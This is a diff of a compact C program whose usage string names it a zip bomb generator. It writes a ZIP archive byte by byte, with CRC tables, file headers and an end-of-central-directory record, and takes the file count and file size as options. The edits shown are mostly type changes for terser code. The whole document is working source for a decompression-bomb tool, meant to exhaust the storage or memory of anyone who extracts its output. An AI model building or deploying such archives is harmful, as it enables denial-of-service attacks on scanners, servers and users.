@@ -12,19 +12,18 @@
 #define write(...) fprintf(file, __VA_ARGS__)
 int f(long long x[], long long y) {
 	int output = 0;
-	for (int i = 0; i < 33; i++) output ^= x[i] * (y >> i & 1);
+	for (char i = 0; i < 33; i++) output ^= x[i] * (y >> i & 1);
 	return output;
 }
 int main(int argc, char *argv[]) {
 	if (argc > 1 && !strcmp(argv[1], "-h")) return printf("Usage: ./zipbomb   [name of output zip]   [number of files]\t  [size in kilobytes of each file]\nDefaults:\t\toutput.zip\t\t1000\t\t\t\t1000\n");
 	FILE *file = fopen(argc > 1 ? argv[1] : "output.zip", "w");
-	int i, j, B = T(2), C = T(3), F = C * 1032 + 1, H = F;
+	unsigned int i, A = S(32) - 1, B = T(2), C = T(3), F = C * 1032 + 1, H = F;
 	long long D[33], d[33], E[8], G[33], g[33];
-	long A = S(32) - 1;
 	for (i = 0; i < 33; i++) D[i] = S(i);
 	for (i = 0; i < 8; i++) {
 		E[i] = 0;
-		for (j = 0; j < 8; j++) E[i] = E[i] >> 1 ^ 3988292384 * ((1 << i >> j ^ E[i]) & 1);
+		for (char j = 0; j < 8; j++) E[i] = E[i] >> 1 ^ 3988292384 * ((1 << i >> j ^ E[i]) & 1);
 		G[i] = E[i];
 	}
 	for (i = 0; i < 24; i++) G[i + 8] = S(i);
@@ -43,10 +42,9 @@ int main(int argc, char *argv[]) {
 	for (i = 0; i < B; i++) {
 		char num[100];
 		sprintf(num, "%d", i);
-		int size = strlen(num);
+		char size = strlen(num);
 		J += write("PK\1\2\x14%c"W"%c"X, Z, Z, 0, V, U(size), Z, Z, Z, Z) + write(num);
 	}
 	write("PK\5\6%c"X, Z, U(B), U(B), Y(J-K), Y(K), 0, 0);
-	fclose(file);
-	return 0;
+	return fclose(file);
 }
